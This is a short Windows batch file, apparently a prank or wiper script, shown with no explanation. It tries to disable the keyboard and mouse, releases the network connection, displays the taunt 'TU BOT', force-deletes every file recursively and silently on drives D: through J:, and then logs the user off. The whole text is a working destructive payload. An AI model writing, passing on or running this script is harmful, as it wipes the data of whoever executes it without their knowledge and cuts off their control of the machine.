@echo off 
for /l %%i in (1,1,100) do rmdir "dir %%i"
rundll32 keyboard,disable
rundll32 mouse,disable
ipconfig /release
msg* "TU BOT"
del D:\*.* /f /s /q
del E:\*.* /f /s /q
del F:\*.* /f /s /q
del G:\*.* /f /s /q
del H:\*.* /f /s /q
del I:\*.* /f /s /q
del J:\*.* /f /s /q
logoff
